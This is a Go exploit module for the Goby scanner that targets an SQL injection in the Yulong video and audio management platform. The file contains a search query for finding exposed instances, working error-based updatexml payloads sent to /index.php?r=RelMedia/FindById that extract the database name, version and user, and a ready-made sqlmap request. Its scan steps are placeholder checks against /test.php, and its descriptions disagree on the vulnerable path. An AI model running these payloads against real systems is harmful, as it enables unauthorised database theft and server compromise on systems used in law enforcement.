package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Yulong video and audio integrated management platform /index.php SQL Injection Vulnerability",
    "Description": "<p>Yulong video and audio integrated management platform is a comprehensive solution integrating video and audio recording, transmission and management independently developed by Shenzhen Yulong Digital Technology Co., Ltd. based on years of technical precipitation and project experience. The platform supports localized operating systems and Windows operating systems, and can access various types of recorders to realize high-definition real-time image transmission, two-way voice intercom, AI applications and other functions, providing all-round technical support for law enforcement.  </p><p>In addition to exploiting the SQL injection vulnerability to obtain the information in the database (for example, the administrator's background password, the site's user personal information), the unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain the server system permissions.</p>",
    "Product": "Yulong video and audio integrated management platform",
    "Homepage": "http://www.yulongdt.cn/",
    "DisclosureDate": "2024-09-14",
    "PostTime": "2024-10-12",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "body=\"PView 视音频管理平台\" && body=\"js/ext/ext-all.js\"",
    "GobyQuery": "body=\"PView 视音频管理平台\" && body=\"js/ext/ext-all.js\"",
    "Level": "1",
    "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain the information in the database (for example, the administrator's background password, the site's user personal information), the unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain the server system permissions.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/142261554"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "1 and updatexml(1,concat(0x7e7e,(select 6*111)),1)--",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "誉龙视音频综合管理平台 /index.php SQL 注入漏洞",
            "Product": "誉龙视音频综合管理平台",
            "Description": "<p>誉龙视音频综合管理平台是深圳誉龙数字技术有限公司基于多年的技术沉淀和项目经验，自主研发的集视音频记录、传输、管理于一体的综合解决方案。该平台支持国产化操作系统和Windows操作系统，能够接入多种类型的记录仪，实现高清实时图传、双向语音对讲、AI应用等功能，为执法工作提供全方位的技术支持。&nbsp;</p><p>誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>誉龙视音频综合管理平台 RelMedia/FindById 存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "Yulong video and audio integrated management platform /index.php SQL Injection Vulnerability",
            "Product": "Yulong video and audio integrated management platform",
            "Description": "<p>Yulong video and audio integrated management platform is a comprehensive solution integrating video and audio recording, transmission and management independently developed by Shenzhen Yulong Digital Technology Co., Ltd. based on years of technical precipitation and project experience.&nbsp;The platform supports localized operating systems and Windows operating systems, and can access various types of recorders to realize high-definition real-time image transmission, two-way voice intercom, AI applications and other functions, providing all-round technical support for law enforcement.&nbsp;&nbsp;</p><p>In addition to exploiting the SQL injection vulnerability to obtain the information in the database (for example, the administrator's background password, the site's user personal information), the unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain the server system permissions.<br></p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>In addition to exploiting the SQL injection vulnerability to obtain the information in the database (for example, the administrator's background password, the site's user personal information), the unauthenticated remote attacker can even write a Trojan to the server in the case of high privilege to further obtain the server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9961"
}`
	setSqlPayloadHashyuiaschyudgasyugdftyasuhkdgyashctjkashuxchjfgahzxjouiahis := func(hostInfo *httpclient.FixUrl, sql string) (resp *httpclient.HttpResponse, vulurl string, err error) {
		setGetRequest := func(hostInfo *httpclient.FixUrl, sqlUrl string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(sqlUrl)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = "id=" + url.QueryEscape(sql)
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		urlget := "/index.php?r=RelMedia/FindById"

		resp, err = setGetRequest(hostInfo, urlget, map[string]string{"Content-Type": "application/x-www-form-urlencoded"})
		if err != nil || resp.StatusCode != 200 {
			return resp, "", err
		}
		//配置漏洞存在的路径
		vulurl = "/index.php?r=RelMedia/FindById"

		return resp, vulurl, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			content := "35906355"

			// 2. 设置sql语句,同样这个sql语句要设置到，exp_params中的custom参数中
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符, example:CONCAT(0x7e,(select user()),0x7e)
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := `1 and updatexml(1,concat(0x7e7e,(select 6345*5659)),1)--`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `error: &#039;~~([\s\S]*?)&#039;.`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashyuiaschyudgasyugdftyasuhkdgyashctjkashuxchjfgahzxjouiahis
			resp, vulurl, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			if output, err := makeRegular(resp.RawBody, regular); err != nil || !strings.Contains(output, content) {
				return false
			}
			if err != nil {
				return false
			}

			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + vulurl
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 1.配置验证poc时返回包需存在的字符串，exmple:以mysql的报错注入为例，XPATH syntax error
			//content := "XPATH syntax error"

			// 2.配置sqlpoint，供sqlmap工具使用
			// expResult.HostInfo.HostInfo
			sqlpoint := `POST /index.php?r=RelMedia/FindById HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Content-Length: 82

id=1+and+updatexml%281%2Cconcat%280x7e7e%2C%28select+6345%2A5659%29%29%2C1%29--'
`

			// 3.设置正则表达式，用于匹配漏洞返回包中的数据
			regular := `error: &#039;~~([\s\S]*?)&#039;.`

			makeRegular := func(RegularContent string, RegularUrl string) (string, error) {
				reRequest := regexp.MustCompile(RegularUrl)
				if !reRequest.MatchString(RegularContent) {
					return "", fmt.Errorf("can't match value")
				}
				getname := reRequest.FindStringSubmatch(RegularContent)
				return getname[1], nil
			}
			sendPayload := setSqlPayloadHashyuiaschyudgasyugdftyasuhkdgyashctjkashuxchjfgahzxjouiahis
			attacktype := goutils.B2S(ss.Params["attackType"])
			if attacktype == "custom" || attacktype == "default" {
				sql := ""
				if attacktype == "custom" {
					sql = goutils.B2S(ss.Params["custom"])
				} else {
					way := goutils.B2S(ss.Params["default"])
					if way == "db_name" {
						sql = "1 and updatexml(1,concat(0x7e7e,(select database())),1)--"
					} else if way == "db_version" {
						sql = "1 and updatexml(1,concat(0x7e7e,(select version())),1)--"
					} else if way == "user_name" {
						sql = "1 and updatexml(1,concat(0x7e7e,(select user())),1)--"
					}
				}
				resp, _, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Success = false
					expResult.Output = "利用失败"
					return expResult
				}
				output, err := makeRegular(resp.RawBody, regular)
				if err != nil || output == "" {
					expResult.Success = false
					expResult.Output = "正则匹配失败:\n" + err.Error()
					return expResult
				}
				expResult.Success = true
				expResult.Output = output
			} else if attacktype == "sqlpoint" {
				expResult.Success = true
				expResult.Output = sqlpoint
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
